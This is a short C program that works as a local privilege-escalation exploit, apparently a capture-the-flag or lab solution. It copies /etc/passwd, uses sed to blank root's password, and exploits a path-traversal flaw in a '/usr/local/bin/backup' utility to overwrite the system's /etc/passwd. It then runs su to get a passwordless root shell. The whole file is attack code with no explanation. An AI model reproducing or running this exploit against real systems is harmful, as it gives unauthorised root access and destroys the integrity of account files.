#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


int main()
{
	system("mkdir -p ~/d1/d2/d3/d4");
	system("mkdir    ~/d1/etc");
	system("cp /etc/passwd ~/d1/etc/");
	system("sed -i 's/^root:[^:]*:/root::/g' ~/d1/etc/passwd ");
	system("cd ~/d1/d2/d3/d4 && /usr/local/bin/backup backup ./../../../etc/passwd");
	system("su");
	return 0;
}
